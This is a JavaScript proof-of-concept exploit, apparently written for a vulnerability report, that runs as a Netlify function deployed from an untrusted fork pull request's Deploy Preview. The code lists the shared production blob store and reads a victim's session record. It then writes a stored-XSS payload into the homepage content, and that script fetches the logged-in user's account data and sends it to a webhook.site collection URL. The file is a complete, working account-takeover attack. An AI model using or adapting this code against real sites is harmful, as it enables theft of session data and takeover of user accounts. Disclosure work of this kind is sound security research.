// ATTACKER function, deployed by an external fork PR into the victim's Deploy Preview.
// Base dir: sponge/ ; path: sponge/netlify/functions/blob.js ; package.json dep: @netlify/blobs
// Invoked at: https://deploy-preview-<PR>--<site>.netlify.app/.netlify/functions/blob
// The attacker curls their own function and reads results from the HTTP response.
import { getStore } from "@netlify/blobs";

const OAST = "https://webhook.site/eb8f11fe-ec83-4c15-ad2f-917c83ad1a65";

export default async (req, context) => {
  const out = { ts: new Date().toISOString(), steps: {} };
  const safe = async (n, f) => { try { out.steps[n] = await f(); } catch (e) { out.steps[n] = { error: String(e).slice(0, 300) }; } };
  const store = getStore("production"); // getStore = site-wide store, shared with production

  // 1. CROSS-USER READ: enumerate the entire production store from the untrusted preview
  await safe("list_all_keys", async () => (await store.list()).blobs.map(b => b.key));

  // 2. CROSS-USER READ: read the victim's session record directly (fabricated victim, VSID1234)
  //    This is a REAL account record an owner/trusted-side write put in the SAME store this
  //    untrusted preview function can read.
  await safe("read_victim_session", async () => ({
    key: "session:VSID1234",
    value: String(await store.get("session:VSID1234")),
  }));

  // 3. Read the owner's trusted production content (baseline, before poisoning)
  await safe("read_trusted_content_before", async () => ({ key: "homepage_content", value: String(await store.get("homepage_content")) }));

  // 4. ATO WRITE: poison the production content key with a stored-XSS payload that, once it
  //    executes in a LOGGED-IN victim's browser, makes a same-origin credentialed fetch to
  //    /.netlify/functions/me (which returns the victim's account JSON because the browser
  //    attaches the victim's own `sid` cookie), then exfils that JSON (base64) to the OAST.
  const XSS = `<script>
fetch('/.netlify/functions/me',{credentials:'include'})
  .then(function(r){return r.text();})
  .then(function(d){
    var img = new Image();
    img.src = '${OAST}/ato?d=' + encodeURIComponent(btoa(d));
    window.__EXODIA_ATO__ = d;
    document.title = 'EXODIA-ATO-FIRED';
  })
  .catch(function(e){
    var img = new Image();
    img.src = '${OAST}/ato-err?e=' + encodeURIComponent(String(e));
  });
</script><h2>Welcome to Sponge</h2>`;
  await safe("poison_homepage_ato_payload", async () => {
    await store.set("homepage_content", XSS);
    return { wrote_bytes: XSS.length, payload: XSS };
  });

  // 5. Confirm the write landed (read it back from the same untrusted function)
  await safe("read_trusted_content_after", async () => ({ key: "homepage_content", value: String(await store.get("homepage_content")) }));

  return new Response(JSON.stringify(out, null, 2), { headers: { "content-type": "application/json", "cache-control": "no-store" } });
};
